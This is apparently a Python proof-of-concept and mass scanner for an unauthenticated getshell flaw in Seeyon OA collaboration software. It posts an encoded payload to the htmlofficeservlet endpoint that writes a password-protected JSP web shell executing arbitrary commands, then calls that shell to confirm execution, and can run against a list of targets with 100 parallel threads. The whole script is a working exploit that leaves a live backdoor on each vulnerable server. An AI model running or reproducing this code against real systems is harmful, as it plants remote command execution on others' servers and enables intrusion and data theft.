import argparse,requests
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
    test = """
                                                                                  
                                                                                          author: 秋妤
                                                                                          date: 2024.09.02
                                                                                          version: 1.0
    """
    print(test)


def poc(target):
    payload = '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+Miko'
    data = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U="

    headers = {
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    }

    try:
        res1 = requests.post(target+'/seeyon/htmlofficeservlet', headers=headers,data=data)
        if res1.status_code == 200:
            res2 = requests.get(target + payload)
            if 'Miko' in res2.text:
                with open('致远 OA 协同管理软件无需登录getshell_result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在漏洞\n")
                    print(f"[+]{target}存在漏洞")
            else:
                print(f"[-]{target}不存在漏洞")
        else:
            print(f"该{target}可能存在问题，请手动检测")
    except Exception as e:
        print(e)


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="这是一个致远 OA 协同管理软件无需登录getshell的扫描脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parse.parse_args()
    try:
        if args.url and not args.file:
            poc(args.url)
        elif args.file and not args.url:
            with open(args.file, 'r', encoding='utf-8') as f:
                for url in f.readlines():
                    url_list.append(url.strip().replace("\n", ""))
                mp = Pool(100)
                mp.map(poc, url_list)
                mp.close()
                mp.join()
        else:
            print("您的输入有误，请使用python3 file_name.py -h for help")
    except Exception as e:
        print(e)



if __name__ == '__main__':
    main()
